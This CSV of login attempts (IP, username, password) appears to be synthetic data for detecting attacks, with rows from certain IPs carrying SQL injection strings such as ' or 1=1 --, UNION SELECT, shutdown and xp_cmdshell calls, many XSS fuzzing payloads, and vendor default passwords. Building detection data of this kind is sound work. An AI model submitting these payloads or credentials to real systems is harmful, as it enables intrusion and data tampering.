ip,username,password
137.98.141.161,secoff,Sxyz
226.43.83.12,shi,000000000c++
58.1.247.172,liao,0l23456789)
16.101.43.73,'sqlattempt1,""") or (""a""=""a"
169.16.185.89,rao,@163.commm
163.8.33.47,ju,node_lc365
164.160.230.156,gou,te-bone198
73.83.122.82,cha,.cc0987654
186.99.169.227,lai,@qq.com111
75.117.210.155,di,@163.com##
137.98.141.161,NEVIEW,admin256
226.43.83.12,shi,000000000c++
58.1.247.172,liao,0l23456789)
16.101.43.73,'or''=',or 0=0 --
169.16.185.89,rao,@163.commm
163.8.33.47,ju,node_1c365
186.99.169.227,lai,@q.com111
75.117.210.155,di,@163.com##)
73.83.122.82,cha,.cc0987654
164.160.230.156,gou,t-bone198
137.98.141.161,NEVIEW,anko
58.1.247.172,liao,0>l23456789)
226.43.83.12,shi,000000000c++
16.101.43.73,(sqlattempt2),' or 1 --'
169.16.185.89,rao,@163.commm
163.8.33.47,ju,node_1c365
164.160.230.156,gou,t-bone198
73.83.122.82,cha,.cc0987654
186.99.169.227,lai,@qq.com111
75.117.210.155,di,@163.com##
58.1.247.172,liao,0l23456789)
137.98.141.161,NEVIEW,Protector
226.43.83.12,shi,000000000c++
16.101.43.73,|,PRINT @@variable
169.16.185.89,rao,@163.commm
163.8.33.47,ju,node_1c365
186.99.169.227,lai,@qq.com111
73.83.122.82,cha,.cc0987654
26.221.2.86,"ABC<div style=""x:\xE2\x80\x82expression(javascript:alert(429)"">DEF","<a href=""\x01365javascript:javascript:alert(1365)"" id=""fuzzelement1365"">test</a>"
164.160.230.156,gou,t-bone198
58.1.247.172,liao,0l23456789)
226.43.83.12,shi,000000(00c++
137.98.141.161,NEVIEW,manager
169.16.185.89,rao,@163.commm
16.101.43.73,PRINT @@variable,' or 3=3
163.8.33.47,ju,node_1c365
164.160.230.156,gou,t-b_ne198
186.99.169.227,lai,@qq.com111
26.221.2.86,&lt;XSS STYLE=&quot;xss:expression(alert(1829))&quot;&gt;,"<svg xmlns=""http://www.w3.org/2000/svg"">LOL<script>alert(876)</script></svg>"
73.83.122.82,cha,.cc0987654
137.98.141.161,NEVIEW,MTS_PASSWORD
58.1.247.172,liao,0l23456789)
226.43.83.12,shi,000000000c++
16.101.43.73,(sqlattempt2),0 or 1=1
169.16.185.89,rao,@163.commm
163.8.33.47,ju,node_1c3S65
186.99.169.227,lai,@qq.com^111
164.160.230.156,gou,t-bone198
26.221.2.86,"\"";alert(735);//","<;TABLE>;<;TD BACKGROUND="";javascript:alert(1903)"";>;<;/TD>;<;/TABLE>;"
73.83.122.82,cha,.cc0987654
137.98.141.161,smtp,technolgi
226.43.83.12,shi,000000000c++
58.1.247.172,liao,0l23456789)
169.16.185.89,rao,@163.commm
16.101.43.73,delete,or
163.8.33.47,ju,node_1c365
26.221.2.86,"<IMG SRC=x oninvalid=""alert(1078))"">",<IMG SRC=javascript:alert(1948)>
73.83.122.82,cha,.cc0987654
164.160.230.156,gou,t-bone198
186.99.169.227,lai,@qq.com111
137.98.141.161,smtp,nobody
226.43.83.12,shi,000000000c++
58.1.247.172,liao,0l23456789)
169.16.185.89,rao,@163.commm
16.101.43.73,' or '1'='1'--,1;SELECT%20*
163.8.33.47,ju,node_1c365
164.160.230.156,gou,t-bone198
26.221.2.86,<IMG SRC=javascript:alert(722))>,"<IMG SRC=""jav&#x0D;ascript:alert(1010);"">"
167.74.166.161,itsys,Symbol
186.99.169.227,lai,@qq.com111
137.98.141.161,smtp,masterkey
58.1.247.172,liao,0l23456789)
226.43.83.12,shi,000000000c++
16.101.43.73,*|,' UNION SELECT
169.16.185.89,rao,@163.commm
163.8.33.47,ju,node_1c365
26.221.2.86,"<IMG SRC=x oninvalid=""alert(1078))"">",<~/XSS/*-*/STYLE=xss:e/**/xpression(alert(1934))>
186.99.169.227,lai,@qq.com111
167.74.166.161,itsys,WEBCAL01
164.160.230.156,gou,t-bone198
58.1.247.172,liao,0l23456789)
226.43.83.12,shi,"00000000""0c++"
137.98.141.161,smtp,744
169.16.185.89,rao,@163.commm
16.101.43.73,\x27UNION SELECT,declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
163.8.33.47,ju,node_1c365
164.160.230.156,gou,t-bone18
26.221.2.86,"ABC<div style=""x:exp\x5Cression(javascript:alert(411)"">DEF","<script\x20type=""text/javascript"">javascript:alert(400);</script>"
186.99.169.227,lai,@qq.com111
167.74.166.161,itsys,1qaz!@#$
58.1.247.172,liao,0l23456789)
226.43.83.12,shi,000000000c++
137.98.141.161,smtp,netadmin
169.16.185.89,rao,@163.commm
16.101.43.73,' UNION SELECT,';shutdown--
163.8.33.47,ju,node_1c365
164.160.230.156,gou,t-bone198
186.99.169.227,lai,@qq.com111
26.221.2.86,<IMG SRC=`javascript:alert(998)`>,"&lt;STYLE TYPE=\""text/javascript\""&gt;alert(903);&lt;/STYLE&gt;"
167.74.166.161,itsys,proxy
58.1.247.172,liao,0l23456789)
137.98.141.161,smtp,ibm
226.43.83.12,shi,000000000c++
169.16.185.89,rao,@163.commm
16.101.43.73,hi' or 'a'='a,' or '' like '
163.8.33.47,ju,node_1c365
186.99.169.227,lai,@qq.com111
164.160.230.156,gou,t|-bone198
26.221.2.86,<font style='color:expression(alert(1734))'>,<;STYLE>;@im\port';\ja\vasc\ript:alert(1915)';;<;/STYLE>;
167.74.166.161,itsys,SpIp
226.43.83.12,shi,000000000c++
58.1.247.172,liao,0l23456789)
137.98.141.161,smtp,IMAGEUSER
169.16.185.89,rao,@163.commm
16.101.43.73,replace,&apos;%20OR
163.8.33.47,ju,node_1c365
26.221.2.86,"<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(642))%7d","<DIV STYLE=""background-image: url(javascript:javascript:alert(683))"">"
186.99.169.227,lai,@qq.com111
164.160.230.156,gou,t-bone198
167.74.166.161,itsys,AIROPLANE
58.1.247.172,liao,0l23456789)
226.43.83.12,shi,000000000c++
137.98.141.161,smtp,primenet
16.101.43.73,' UNION SELECT,"or 1=1 or """"="
163.8.33.47,ju,node_1c365
165.27.244.242,' or user like '%,(sqlattempt2)
167.74.166.161,itsys,nokai
164.160.230.156,gou,t-bone198
186.99.169.227,lai,@qq.com111
26.221.2.86,"<a href=""\x05javascript:javascript:alert(1336)"" id=""fuzzelement1336"">test</a>","<form><iframe &#09;&#16870;&#16871687; src=""javascript&#58;alert(1687)""&#16871687;&#16870;&#09;;>"
226.43.83.12,shi,000000000c++
58.1.247.172,liao,0l23456789)
137.98.141.161,USER8,42Emerson42Eme
163.8.33.47,qin,iiiiiiii10%
16.101.43.73,' or '' like ',handler
165.27.244.242,%29,or%201=1 --
26.221.2.86,"<body onunload=""javascript:alert(1737);"">","ABC<div style=""x:\xC2\xA0expression(javascript:alert(416)"">DEF"
164.160.230.156,gou,t-bone198
186.99.169.227,lai,@qq.com111
167.74.166.161,itsys,R1QTPS
58.1.247.172,liao,0l23456789)
137.98.141.161,USER8,vgnadmin
226.43.83.12,shi,000000000c++
16.101.43.73,select,*/*
165.27.244.242,‘ or 3=3 --,' or 1=1 or ''='
163.8.33.47,qin,iiiiiiii10%
186.99.169.227,lai,@qq.com111
164.160.230.156,gou,t-bone198
26.221.2.86,<~/XSS/*-*/STYLE=xss:e/**/xpression(alert(1934))>,"<math href=""javascript:javascript:alert(1486)"">CLICKME</math>  <math> <maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:javascript:alert(1486)"">CLICKME</maction> </math>"
167.74.166.161,itsys,amigosw1
58.1.247.172,liao,0l23456789)
137.98.141.161,USER8,UI-PSWD-01
226.43.83.12,shi,000000000c++
16.101.43.73,' or uid like '%,having
165.27.244.242,' or uname like '%,|
163.8.33.47,qin,iiiiiiii10%
186.99.169.227,lai,@qq.com11n1
26.221.2.86,"<comment><img src=""</comment><img src=x onerror=javascript:alert(576))//"">",<script>alert(1954)</script>
164.160.230.156,gou,t-bone198
167.74.166.161,itsys,AMI_SW
58.1.247.172,liao,0l23456789)
137.98.141.161,USER8,dmr99
226.43.83.12,shi,000000000c++
16.101.43.73,%29,' or user like '%
163.8.33.47,qin,iiiiiiii10%
165.27.244.242,""" or 0=0 --",'||UTL_HTTP.REQUEST
167.74.166.161,supervisor,911
164.160.230.156,gou,t-bone198
26.221.2.86,"<style onReadyStateChange style onReadyStateChange=""javascript:javascript:alert(314)""></style onReadyStateChange>",<// style=x:expression\28javascript:alert(1559)\29>
186.99.169.227,lai,@qq.com111
51.204.173.195,""">/KinG-InFeT.NeT/><script>alert(1775)</script>","<a style=""behavior:url(#default#AnchorClick);"" folder=""javascript:javascript:alert(1571)"">XXX</a>"
137.98.141.161,USER8,ADLDEMO
58.1.247.172,liao,0l23456789)G
163.8.33.47,qin,iiiiiiii10%
16.101.43.73,procedure,(sqlattempt2)
165.27.244.242,' or 3=3,' or uname like '%
137.44.5.150,min,34567.cc
167.74.166.161,supervisor,splendidcrm2005
26.221.2.86,"<frameset onScroll frameset onScroll=""javascript:javascript:alert(1198)""></frameset onScroll>","<img src=x onerror=\x32""javascript:alert(1544)"">"
186.99.169.227,lai,@@q.com111
51.204.173.195,"<marquee onScroll marquee onScroll=""javascript:javascript:alert(1222)""></marquee onScroll>","ABC<div style=""x:\xE2\x80\x8Bexpression(javascript:alert(426)"">DEF"
137.98.141.161,admin01,bpel
58.1.247.172,liao,0l23456789)
163.8.33.47,qin,iiiiiiii10%
167.185.155.71,cha,12345q;ert+
165.27.244.242,replace,or%201=1 --
186.99.169.227,lai,@qq.com11
137.44.5.150,min,34567.cc
26.221.2.86,"<iframe srcdoc=""&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(710)&amp;gt;>"">",<brute contenteditable onfocus=alert(180)>focus this!
167.74.166.161,supervisor,db2inst1
137.98.141.161,admin01,network
51.204.173.195,"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert(1036);"">",&lt;br size=\&quot;&amp;{alert(1862)}\&quot;&gt;
58.1.247.172,meng,gggggggg1/3
163.8.33.47,qin,iiiiiiii10%
165.27.244.242,*(|(mail=*)),' or userid like '%
167.185.155.71,cha,12345qwert+
77.189.24.142,lin,@sohu.com530
26.221.2.86,"`""'><img src=xxx:x \x0Conerror=javascript:alert(1396)>","<a href=""javascript\x09:javascript:alert(488)"" id=""fuzzelement488"">test</a>"
137.44.5.150,min,34567.cc
167.74.166.161,supervisor,RIP000
137.98.141.161,admin01,asd123456789
51.204.173.195,&lt;SCRIPT&gt;alert(906);&lt;/SCRIPT&gt;,"<comment><img src=""</comment><img src=x onerror=javascript:alert(576))//"">"
58.1.247.172,meng,gggggggg1/3
165.27.244.242,' or uid like '%,' (select top 1
167.185.155.71,cha,12345qwert+
163.8.33.47,qin,iiiiiiii10%
26.221.2.86,"<IMG SRC=x onkeyup=""alert(1085))"">","<form id=""test"" /><button form=""test"" formaction=""javascript:javascript:alert(1609)"">X"
137.44.5.150,min,34567.cc
167.74.166.161,supervisor,Fiery.1
77.189.24.142,lin,@sohu.com530
137.98.141.161,admin01,tetra
51.204.173.195,"0\""autofocus/onfocus=alert(1050)--><video/poster/ error=prompt(2)>""-confirm(3)-""","<body onMouseOver body onMouseOver=""javascript:javascript:alert(1204)""></body onMouseOver>"
58.1.247.172,meng,gggggggg1/3
163.8.33.47,qin,iiiiiiii10%
167.185.155.71,cha,12345qwert+
165.27.244.242,1 or 1=1,' and '' like ''--
167.74.166.161,supervisor,SAP
77.189.24.142,lin,@sohu.com530
26.221.2.86,"<img src=x\x15350onerror=""javascript:alert(1535)"">","<a href=""\xE438\xA0\x8Ejavascript:javascript:alert(438)"" id=""fuzzelement438"">test</a>"
137.44.5.150,min,34567.cc
51.204.173.195,"'""></title><script>alert(1779)</script>><marquee><h1>XSS by xss</h1></marquee>","<iframe onLoad iframe onLoad=""javascript:javascript:alert(296)""></iframe onLoad>"
137.98.141.161,admin01,powerdown
58.1.247.172,meng,gggggggg1/3
165.27.244.242,%27%20or%201=1,= '
167.185.155.71,cha,12345qwert+
163.8.33.47,qin,iiiiiiii10%
137.44.5.150,min,34567.cc
77.189.24.142,lin,@sohu.com530
167.74.166.161,supervisor,tslinux
26.221.2.86,"<IMG SRC=""jav&#x09;ascript.:alert(238);"">","<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(967)}),x</script>"
51.204.173.195,¼script¾alert(1668)¼/script¾,"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS&lt;SCRIPT DEFER&gt;alert(957)&lt;/SCRIPT&gt;""></BODY></HTML>"
58.1.247.172,meng,gggggggg1/3
137.98.141.161,admin01,TURBINE
163.8.33.47,qin,iiiiiiii10%
165.27.244.242,1 or 1=1,/
167.185.155.71,cha,12345qwert+
167.74.166.161,supervisor,alphacom
77.189.24.142,lin,@sohu.com530
26.221.2.86,"ABC<div style=""x:\xE2\x80\x88expression(javascript:alert(424)"">DEF","<frameset onScroll frameset onScroll=""javascript:javascript:alert(299)""></frameset onScroll>"
137.44.5.150,min,34567.>cc
58.1.247.172,meng,gggggggg1/3
51.204.173.195,"\\"";alert(878);//",<script>/* *\x2A/javascript:alert(1279)// */</script>
137.98.141.161,admin01,HARRIS
163.8.33.47,qin,iiiiiiii10%
167.185.155.71,cha,12345qwert+
165.27.244.242,""" or ""a""=""a",""" or 1=1--"
26.221.2.86,<img src=`xx:xx`onerror=alert(788)>,"""><s""%2b""cript>alert(1971)</script>"
77.189.24.142,lin,@sohu.com530
167.74.166.161,supervisor,test
137.44.5.150,min,3567.cc
58.1.247.172,meng,gggggggg1/3
4.179.162.61,"<html onMouseOver html onMouseOver=""javascript:javascript:alert(319)""></html onMouseOver>","<iframe/src=""data:text/html,<svg &#168516851685;&#168516850;load=alert(1685)>"">"
51.204.173.195,<script>({0:#0=eval/#0#/#0#(javascript:alert(649))})</script>,"<img \x34src=x onerror=""javascript:alert(1523)"">"
165.27.244.242,update,' --
163.8.33.47,qin,iiiiiiii10%
167.185.155.71,cha,12345qwert+
167.74.166.161,supervisor,sysmanager888
77.189.24.142,lin,@sohu.com53i0
137.44.5.150,min,34567.cc
26.221.2.86,perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;alert(1852)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out,"</span></span><svg onload=""alert(1976)//“ #""="""">"
58.1.247.172,meng,ggggg9gg1/3
51.204.173.195,"<? foo=""><script>alert(964)</script>"">","<img \x00src=x onerror=""alert(1512)"">"
4.179.162.61,"""`'><script>\xE2\x80\x8Bjavascript:alert(1427)</script>",<b <script>alert(583)</script>0
165.27.244.242,\x27\x4F\x52 SELECT *,declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
167.185.155.71,cha,12345qwert+
163.8.33.47,qin,iiiiiiii10%
77.189.24.142,lin,@sohu.com530
137.44.5.150,min,34567.cc
26.221.2.86,<form><button formaction=javascript&colon;alert(838)>CLICKME,"<a href=""\x13745javascript:javascript:alert(1374)"" id=""fuzzelement1374"">test</a>"
58.1.247.172,meng,gggggggg1/3
51.204.173.195,<!--[if<img src=x onerror=javascript:alert(638)//]> -->,<BODY BACKGROUND=”javascript:alert(849)”>
4.179.162.61,"<frameset onBlur frameset onBlur=""javascript:javascript:alert(325)""></frameset onBlur>","<iframe src=""%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(97)"">"
167.74.166.161,nmt,Abc123!
165.27.244.242,delete,PRINT
167.185.155.71,cha,12345qwerto
163.8.33.47,qin,iiiiiiii10%
77.189.24.142,lin,@sohu.com530
137.44.5.150,min,34567.cc
167.74.166.161,nmt,asd123456
4.179.162.61,"perl -e 'print \""&lt;IMG SRC=java\0script&#058;alert(921)&gt;\"";' &gt; out","<a href=""javas\x0Acript:javascript:alert(369)"" id=""fuzzelement369"">test</a>"
157.213.102.154,"<IMG SRC=""jav	ascript:alert(726);"">","<IMG SRC=""jav&#x0D;ascript:alert(1010);"">"
51.204.173.195,='><script>alert(222)</script>,"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:javascript:alert(1593);"">"
58.1.247.172,meng,gggggggg1/3
165.27.244.242,),"""' or 1 --'"""
163.8.33.47,qin,iiiiiiii10%
167.185.155.71,cha,123<45qwert+
77.189.24.142,lin,@sohu.com530
137.44.5.150,min,34567.cc
51.204.173.195,"<;IFRAME SRC="";javascript:alert(1884);"";>;<;/IFRAME>;",<IMG SRC=JaVaScRiPt:alert(996)>
167.74.166.161,nmt,LR-ISDN
4.179.162.61,<IMG SRC=`javascript:javascript:alert(1578)`>,"<img src=""javascript:alert(587)"">"
157.213.102.154,"<x '=""foo""><x foo='><img src=x onerror=javascript:alert(1499)//'>","""><img src=x onerror=javascript:alert(1459))>"
58.1.247.172,meng,gggggggg1/3
163.8.33.47,qin,iiiiiiii10%
165.27.244.242,/,' or 1=1 or ''='
167.185.155.71,cha,12345qwert+
77.189.24.142,lin,@sohu.com530
137.44.5.150,min,34567.cc
157.213.102.154,"<TABLE><TD BACKGROUND=""javascript:alert(761)"">","<body onFocus body onFocus=""javascript:javascript:alert(298)""></body onFocus>"
58.1.247.172,meng,gggggggg1/3
167.74.166.161,nmt,12345678
4.179.162.61,"<IMG SRC=x oncontextmenu=""alert(1076))"">",&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(1835);&quot;&gt;]]&gt;
51.204.173.195,"""`'><script>\xE2\x80\x89javascript:alert(1407)</script>","<a href=""\x1359Djavascript:javascript:alert(1359)"" id=""fuzzelement1359"">test</a>"
163.8.33.47,qin,iiiiiiii10%
167.185.155.71,cha,123 45qwert+
165.27.244.242,'or select *,""" or ""a""=""a"
137.44.5.150,min,34567.cc
77.189.24.142,lin,@sohu.com530
4.179.162.61,"<a href=""\x458Fjavascript:javascript:alert(458)"" id=""fuzzelement458"">test</a>","<TABLE><TD BACKGROUND=""javascript:javascript:alert(1596)"">"
157.213.102.154,"<img\x47src=x onerror=""javascript:alert(1520)"">",<body onscroll=javascript:alert(696)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
167.74.166.161,nmt,bravo_2008
51.204.173.195,"""><script>alert(989))</script>","<BODY BACKGROUND=""javascript:alert(1652)"">"
58.1.247.172,meng,gggggggg1/3
165.27.244.242,\x27\x6F\x72 SELECT *,' or 1=1--
167.185.155.71,cha,12345qwert+
163.8.33.47,qin,iiiiiiii10%
137.44.5.150,min,34567.cc
77.189.24.142,lin,@sohu.com530
157.213.102.154,&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(1827);&lt;/STYLE&gt;,"<img src=x\x6243onerror=""javascript:alert(624)"">"
51.204.173.195,<BODY ONLOAD=alert(742)>,"<script\x0Dtype=""text/javascript"">javascript:alert(402);</script>"
4.179.162.61,<body onscroll=alert(865)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>,"<IMG SRC=x onplaying=""alert(1119))"">"
58.1.247.172,meng,gggggggg13
167.74.166.161,nmt,broadband
163.8.33.47,qin,iiiiiiii10%
165.27.244.242,',%21
167.185.155.71,cha,12345qwert+
137.44.5.150,min,34567.cc
77.189.24.142,lin,@sohu.com530
167.74.166.161,nmt,master
4.179.162.61,"""`'><script>\xE2\x80\x87javascript:alert(522)</script>",%3c/title%3e%3cscript%3ealert(229)%3c/script%3e
157.213.102.154,"<a href=""\x07javascript:javascript:alert(462)"" id=""fuzzelement462"">test</a>","<body onMouseOver body onMouseOver=""javascript:javascript:alert(1204)""></body onMouseOver>"
51.204.173.195,"<script\x0Dtype=""text/javascript"">javascript:alert(280);</script>",<embed src=javascript:alert(198)>
58.1.247.172,meng,gggggggg1/3
167.185.155.71,cha,12345qwert+
163.8.33.47,qin,iiiiiiii10%
165.27.244.242,'; exec master..xp_cmdshell,insert
137.44.5.150,min,34567.cc
77.189.24.142,lin,@sohu.com530
157.213.102.154,"<a href=""\xC2\xA0javascript:javascript:alert(1335)"" id=""fuzzelement1335"">test</a>",X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(653)` >
58.1.247.172,meng,gggggggg1/3
4.179.162.61,"<input type=""text"" value=`` <div/onmouseover='alert(1699)'>X</div>","<body onPageHide body onPageHide=""javascript:javascript:alert(304)""></body onPageHide>"
167.74.166.161,nmt,HPDESK
51.204.173.195,<brute contenteditable onkeypress=alert(183)>press any key!,"\"";alert(1649);//"
165.27.244.242,"hi"" or 1=1 --",'or'='or'
163.8.33.47,qin,iiiiiiii1M0%
167.185.155.71,cha,12345qwert+
77.189.24.142,lin,@sohu.com530
137.44.5.150,min,34H67.cc
157.213.102.154,"<img src=""javascript:alert(1501)"">","""><script alert(1744))</script>"
58.1.247.172,meng,gggggggg1/3
167.185.155.71,cha,12345qwert+
4.179.162.61,"<FRAMESET><FRAME SRC=""javascript:alert(948);""></FRAMESET>","<DIV STYLE=""background-image: url(javascript:alert(951))"">"
163.8.33.47,qin,iiiiiiii10%
51.204.173.195,--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(362)> -->,"<IMG SRC=""javascript:alert(1648)"""
165.27.244.242,anything' OR 'x'='x,insert
167.74.166.161,nmt,Toshiba
137.44.5.150,min,34567.cc
77.189.24.142,lin,@sohu.com530
157.213.102.154,<img src=63 onerror=!function(){alert(63)}()>,<brute contenteditable onfocus=alert(180)>focus this!
58.1.247.172,meng,ggggggg1/3
51.204.173.195,"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(778)&NewLine;>X</a>","<;META HTTP-EQUIV="";Set-Cookie""; Content="";USERID=<;SCRIPT>;alert(1906)<;/SCRIPT>;"";>;"
167.185.155.71,cha,12345qwert+
4.179.162.61,"<img src=x onerror=\x32""javascript:alert(630)"">","<img src=x\x6210onerror=""javascript:alert(621)"">"
167.74.166.161,CIS,trendimsa1.0
163.8.33.47,qin,iiiiiiii10%
165.27.244.242,' and '' like ''--,""" or 1=1--"
77.189.24.142,lin,@sohu.com530
137.44.5.150,min,34567.cc
157.213.102.154,</script></script><<<<script><>>>><<<script>alert(1768)</script>,"<script\x3Etype=""text/javascript"">javascript:alert(279);</script>"
58.1.247.172,meng,gggggggg1/3
51.204.173.195,"<script\x20type=""text/javascript"">javascript:alert(1177);</script>","<a onmouseover=""alert(719)"">xxs link</a>"
167.185.155.71,cha,12345q&wert+
4.179.162.61,"<bgsound onPropertyChange bgsound onPropertyChange=""javascript:javascript:alert(1207)""></bgsound onPropertyChange>","<img \x34src=x onerror=""javascript:alert(609)"">"
167.74.166.161,CIS,cc
163.8.33.47,qin,iiiiiiii10%
165.27.244.242,' or a=a--,' or 1=1--
77.189.24.142,lin,@sohu.com530
137.44.5.150,min,34567.cc
157.213.102.154,"<img src=287 href=287 onerror=""javascript:alert(287)""></img>","<script\x3Etype=""text/javascript"">javascript:alert(279);</script>"
58.1.247.172,meng,gggggggg1/3
51.204.173.195,"<img \x00src=x onerror=""javascript:alert(611)"">","ABC<div style=""x:\x20expression(javascript:alert(423)"">DEF"
167.185.155.71,cha,12345qwert+
4.179.162.61,"<html onMouseOver html onMouseOver=""javascript:javascript:alert(319)""></html onMouseOver>","<% foo><x foo=""%><script>alert(875)</script>"">"
167.74.166.161,CIS,vantage12!
163.8.33.47,pan,3344520www.
165.27.244.242,char%4039%41%2b%40SELECT,hi' or 'a'='a
77.189.24.142,lin,@sohu.com530
137.44.5.150,min,34567.cc
58.1.247.172,meng,gggggggg1/3
157.213.102.154,"""+alert(16)+""","<video src=1188 href=1188 onerror=""javascript:alert(1188)""></video>"
51.204.173.195,"ABC<div style=""x:\xE2\x80\x84expression(javascript:alert(415)"">DEF","<script\x0Dtype=""text/javascript"">javascript:alert(1301);</script>"
167.185.155.71,bian,e-mail1969
167.74.166.161,CIS,resumix
4.179.162.61,"""><img src=x onerror=javascript:alert(1454)>",<script\x20>javascript:alert(548)</script>
165.27.244.242,hi' or 'a'='a,' or 0=0 --
163.8.33.47,pan,3344520www.
77.189.24.142,lin,@sohu.com530
137.44.5.150,min,34567.cc
157.213.102.154,<body oninput=javascript:alert(1485)><input autofocus>,"""'`><\x3Cimg src=xxx:x onerror=javascript:alert(1293)>"
51.204.173.195,"""`'><script>-javascript:alert(1417)</script>","<IMG SRC=x onload=""alert(1132))"">"
58.1.247.172,meng,gggggggg1/3
167.74.166.161,CIS,radius
4.179.162.61,"ABC<div style=""x:\x0Dexpression(javascript:alert(419)"">DEF","""`'><script>\xC2\x85javascript:alert(525)</script>"
167.185.155.71,bian,e-mail199
163.8.33.47,pan,3344520www.
165.27.244.242,asc,' UNION SELECT
137.44.5.150,min,34567.cc
77.189.24.142,lin,@sohu.com530
157.213.102.154,&apos;;alert(1804))//\&apos;;alert(1804))//&quot;;alert(1804))//\&quot;;alert(1804))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(1804))&lt;/SCRIPT&gt;,<STYLE>@im\port'\ja\vasc\ript:alert(953)';</STYLE>
51.204.173.195,"<meta charset=""mac-farsi"">¼script¾javascript:alert(1566)¼/script¾",http://www.google<script .com>alert(1151)</script
58.1.247.172,meng,gggggggg1/3
167.185.155.71,bian,e-mail1969
4.179.162.61,"<a href=""\x0Djavascript:javascript:alert(472)"" id=""fuzzelement472"">test</a>","""`'><script>\xE2\x80\x80javascript:alert(1429)</script>"
167.74.166.161,CIS,HELPDESK
220.199.141.133,&lt;SCRIPT&gt;alert(1805)&lt;/SCRIPT&gt;,"<a href=""javas\x04cript:javascript:alert(373)"" id=""fuzzelement373"">test</a>"
163.8.33.47,pan,3344520ww.
77.189.24.142,qi,seven50%
137.44.5.150,min,34567.cc
66.45.88.41,yang,1/2admin
157.213.102.154,"<STYLE type=""text/css"">BODY{background:url(""javascript:javascript:alert(1603)"")}</STYLE>","<style></style\x3E<img src=""about:blank"" onerror=javascript:alert(1281)//></style>"
58.1.247.172,meng,gggggggg1/3
4.179.162.61,"&lt;IMG SRC=\""javascript&#058;alert(916)\""","<style onLoad style onLoad=""javascript:javascript:alert(1210)""></style onLoad>"
167.185.155.71,bian,e-mail1969
167.74.166.161,TRACESRV,mercury
220.199.141.133,"&lt;STYLE&gt;&#46;XSS{background-image&#58;url(\""javascript&#058;alert(904)\"");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;","<a href=""\xE2\x80\x88javascript:javascript:alert(441)"" id=""fuzzelement441"">test</a>"
163.8.33.47,pan,3344520www.
137.44.5.150,min,34567.Ecc
77.189.24.142,qi,seven50%
66.45.88.41,yang,1/2admin
157.213.102.154,<body onscroll=javascript:alert(1480)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>,"<;IMG SRC="";jav&;#x0D;ascript:alert(1919);"";>;"
58.1.247.172,meng,gggggggg1/3
167.185.155.71,bian,e-mail1969
4.179.162.61,"""`'><script>\xE2\x80\x89javascript:alert(508)</script>",<script>alert(11);</script>
167.74.166.161,TRACESRV,123321
163.8.33.47,pan,3344520www.
220.199.141.133,"<img src\x6162=x onerror=""javascript:alert(616)"">",%3cscript%3ealert(1955)%3c/script%3e
77.189.24.142,qi,seven50%
137.44.5.150,min,34567.cc
58.1.247.172,meng,gggggggg1/3
